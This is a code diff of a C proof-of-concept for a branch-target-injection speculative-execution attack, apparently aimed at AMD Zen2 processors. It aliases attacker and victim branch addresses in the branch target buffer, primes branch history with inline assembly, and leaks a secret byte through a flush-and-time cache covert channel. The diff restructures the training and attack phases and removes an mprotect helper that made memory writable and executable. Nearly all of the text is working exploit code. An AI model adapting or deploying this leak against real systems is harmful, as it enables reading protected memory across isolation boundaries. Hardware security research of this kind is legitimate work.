@@ -16,11 +16,6 @@
 #include <sys/mman.h>
 #include <unistd.h>
 
-enum training_mode {
-  TRAIN,
-  ATTACK,
-};
-
 /* The rdtscp in itself takes about 60 cycles on Zen2 */
 #define CACHE_HIT_THRESHOLD 80
 /* Covert channel */
@@ -63,8 +58,8 @@ asm (
 );
 
 /* These two addresses are carefully chosen to alias in the BTB. */
-#define VICTIM_BRANCH_ADDRESS 0x41bababababf
-#define ATTACKER_BRANCH_ADDRESS 0x41b2ba3abae1
+#define ATTACKER_BRANCH_ADDRESS 0x41bababababf
+#define VICTIM_BRANCH_ADDRESS 0x41b2ba3abae1
 
 void flush();
 void measure();
@@ -93,7 +88,6 @@ asm (
   "attacker_insns__end:\n"
 );
 
-
 void branch_history_target();
 asm (
 ".align 0x2000\n"
@@ -120,9 +114,6 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
   for (int i = 0; i < BRANCH_HISTORY_STEPS; i++)
     branch_history[i] = (uint64_t)branch_history_target;
 
-  enum training_mode training_sequence[6] = {TRAIN};
-  training_sequence[5] = ATTACK;
-
   void (*target)(void *, void *) = NULL;
   void *pointer_to_target = (void *)(&target);
 
@@ -135,66 +126,74 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
     /* Clear the cache so that a hit in the covert channel is
      * can be measured as a side channel.
      */
-    flush_range((uint64_t)covert_channel, 1<<STRIDE_BITS, NUM_ELEMENTS);
+    flush_covert_channel();
+    target = malicious_target;
 
-    for (int i = 0; i < 6; i++) {
-        if (training_sequence[i] == ATTACK) {
-          /* Here, the benign target is executed speculatively, but the BPU is
-           * trained to speculate to malicious_target So, the RET instructionis
-           * changed back to the original byte so that the secret dependent load
-           * can be executed speculatively.
-           */
-          target = benign_target;
-        } else {
-          /* During the training phase, `malicious_target` is executed
-           * architecturally, so the first byte is replaced with a `RET`.
-           */
-          // *(uint8_t *)(malicious_target) = RET;
-          target = malicious_target;
-        }
+    __asm__ volatile(
+      /* Move the value of 'secret' into register RDI (first argument). */
+      "mov %[leak_addr], %%rdi\n"
+      /* Move the value of 'covert_channel' into register RSI (second argument).
+        */
+      "mov %[covert_channel], %%rsi\n"
+      /* Invalidate the cache line containing the address pointed to by
+        * `pointer_to_target`.
+        */
+      "clflush (%[pointer_to_target])\n"
+      /* Load the value at the address pointed to by `pointer_to_target` into
+        * register RAX.
+        */
+      "mov (%[pointer_to_target]), %%r11\n"
+      /* create some execution history for the TAGE predictions */
+      "push %[icall]\n"
+      "mov %[branch_history], %%r10 \n\t"
+      /* Clear any TAGE predictions based on history */
+      ".rept " xstr(BRANCH_HISTORY_STEPS) "\n\t"
+      "pushq (%%r10)\n\t"
+      "add $8, %%r10\n\t"
+      ".endr\n\t"
+      "ret\n"
+      : /* No output operands */
+      : [pointer_to_target] "r"(&pointer_to_target),
+        [leak_addr] "r"(dummy),
+        [covert_channel] "r"(covert_channel),
+        [branch_history] "r" (branch_history),
+        [icall] "r" (ATTACKER_BRANCH_ADDRESS)
+      : "rax", "rdi", "rsi", "r11", "rax");
 
+      asm("flush:\n");
+      flush_covert_channel();
+
+      target = benign_target;
       __asm__ volatile(
         /* Move the value of 'secret' into register RDI (first argument). */
         "mov %[leak_addr], %%rdi\n"
         /* Move the value of 'covert_channel' into register RSI (second argument).
-         */
+          */
         "mov %[covert_channel], %%rsi\n"
         /* Invalidate the cache line containing the address pointed to by
-         * `pointer_to_target`.
-         */
+          * `pointer_to_target`.
+          */
         "clflush (%[pointer_to_target])\n"
         /* Load the value at the address pointed to by `pointer_to_target` into
-         * register RAX.
-         */
+          * register RAX.
+          */
         "mov (%[pointer_to_target]), %%r11\n"
         /* create some execution history for the TAGE predictions */
         "push %[icall]\n"
         "mov %[branch_history], %%r10 \n\t"
-        // build an execution path to prime some history
+        /* Clear any TAGE predictions based on history */
         ".rept " xstr(BRANCH_HISTORY_STEPS) "\n\t"
         "pushq (%%r10)\n\t"
         "add $8, %%r10\n\t"
         ".endr\n\t"
-
-        // "movl $1, %%r8d\n"
-        // "jmp .L2\n"
-        // ".L3:\n"
-        // "addl $1, %%r8d\n"
-        // ".L2:\n"
-        // "cmpl $100, %%r8d\n"
-        // "jle .L3\n"
         "ret\n"
         : /* No output operands */
         : [pointer_to_target] "r"(&pointer_to_target),
-          [leak_addr] "r"(training_sequence[i] == TRAIN ? dummy : secret_addr),
+          [leak_addr] "r"(secret_addr),
           [covert_channel] "r"(covert_channel),
           [branch_history] "r" (branch_history),
-          [icall] "r" (training_sequence[i] == TRAIN ? VICTIM_BRANCH_ADDRESS : VICTIM_BRANCH_ADDRESS)
+          [icall] "r" (ATTACKER_BRANCH_ADDRESS)
         : "rax", "rdi", "rsi", "r11", "rax");
-        asm("flush:\n");
-        flush_range((uint64_t)covert_channel, 1<<STRIDE_BITS, NUM_ELEMENTS);
-        continue;
-    }
 
     asm("measure:\n");
 
@@ -240,26 +239,6 @@ void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
   result++;
 }
 
-int make_target_writeable(void *malicious_target) {
-  long page_size = sysconf(_SC_PAGESIZE);
-  if (page_size == -1) {
-    perror("sysconf(_SC_PAGESIZE)");
-    return -1;
-  }
-
-  /* TODO: Using 64 as a best guess as 64 is the size of the cache line,
-   * mprotect may just mark the whole page as writeable.
-   */
-  void *aligned_target = (void *)((long)malicious_target & (~(page_size - 1)));
-
-  if (mprotect(aligned_target, 64, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
-    perror("mprotect");
-    return -1;
-  }
-
-  return 0;
-}
-
 int main() {
   /* Pin to CPU 0 */
   set_cpu_affinity(24);
@@ -281,11 +260,6 @@ int main() {
 
   memcpy((void *)VICTIM_BRANCH_ADDRESS, victim_insns, victim_insns__size);
   memcpy((void *)ATTACKER_BRANCH_ADDRESS, attacker_insns, attacker_insns__size);
-
-  if (make_target_writeable(malicious_target) != 0) {
-    printf(
-        "Unable to change permissions (mprotect(RWX)) of the malicious target");
-  }
 
   char result[2];
   int score[2];
